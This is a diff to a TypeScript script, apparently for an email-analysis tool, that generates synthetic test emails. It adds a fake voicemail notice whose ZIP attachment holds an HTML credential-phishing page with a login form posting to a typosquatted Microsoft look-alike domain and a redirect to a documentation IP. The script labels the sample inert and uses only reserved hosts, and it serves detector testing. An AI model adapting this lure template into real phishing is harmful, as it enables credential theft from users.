@@ -2,6 +2,7 @@
 // Every domain is reserved (.example / example.net), every IP is from documentation ranges,
 // and attachments contain only harmless placeholder text. Nothing here is real mail.
 import { writeFileSync } from 'node:fs';
+import { deflateRawSync } from 'node:zlib';
 import { compressRtf, makeMsg } from './msg.ts';
 import { makePdf } from './pdf.ts';
 import { makeZip } from './zip.ts';
@@ -349,6 +350,55 @@ Content-Transfer-Encoding: base64
 
 ${b64(contractDocx)}
 --ct--
+`;
+
+// 10: a "new voicemail" notice whose only content is a ZIP. Inside is an HTML "player" that is really a sign-in
+// page posting to a Microsoft look-alike, plus a script redirect to a documentation IP. The email has no links.
+const voicemailHtml = `<!doctype html>
+<html><head><title>Voice message</title></head><body>
+<h1>SYNTHETIC SAMPLE</h1>
+<p>This file imitates the HTML "voicemail player" pages sent inside ZIP files for credential phishing. It is inert.</p>
+<p>Sign in with your work account to play the message.</p>
+<form action="https://login.rnicrosoftonline-voice.example/common/auth" method="post"><input name="login"><input name="passwd" type="password"></form>
+<script>/* synthetic: never runs in mailsleuth */ var next = "https://198.51.100.61/vm/play";</script>
+</body></html>`;
+const voicemailZip = makeZip([
+  { name: 'VM_0042/', data: '' },
+  { name: 'VM_0042/Play_Voicemail.html', data: voicemailHtml, deflated: deflateRawSync(voicemailHtml) },
+]);
+samples['10-voicemail-zip.eml'] = `Return-Path: <notify@hosted-pbx-alerts.example>
+Received: from mx1.example.net (mx1.example.net [192.0.2.10])
+ by mailstore.example.net with LMTP id 3C9E02; Sat, 21 Nov 2026 07:41:05 +0000
+Received: from out.hosted-pbx-alerts.example (out.hosted-pbx-alerts.example [203.0.113.140])
+ by mx1.example.net with ESMTPS id 4d2a7f; Sat, 21 Nov 2026 07:41:03 +0000
+Authentication-Results: mx1.example.net;
+ spf=pass smtp.mailfrom=notify@hosted-pbx-alerts.example;
+ dkim=pass header.d=hosted-pbx-alerts.example;
+ dmarc=pass header.from=hosted-pbx-alerts.example
+From: "Voice Mail" <notify@hosted-pbx-alerts.example>
+To: "Alex Rivera" <alex@example.net>
+Subject: New voice message (0:42) from +1 555 0100
+Date: Sat, 21 Nov 2026 07:41:00 +0000
+Message-ID: <synthetic-0010@hosted-pbx-alerts.example>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="vm"
+
+--vm
+Content-Type: text/plain; charset=utf-8
+
+You received a new voice message.
+
+Caller: +1 555 0100
+Length: 0:42
+
+The recording is attached.
+--vm
+Content-Type: application/zip; name="VM_0042.zip"
+Content-Disposition: attachment; filename="VM_0042.zip"
+Content-Transfer-Encoding: base64
+
+${b64(voicemailZip)}
+--vm--
 `;
 
 for (const [name, body] of Object.entries(samples)) writeFileSync(new URL(`../samples/${name}`, import.meta.url), body);
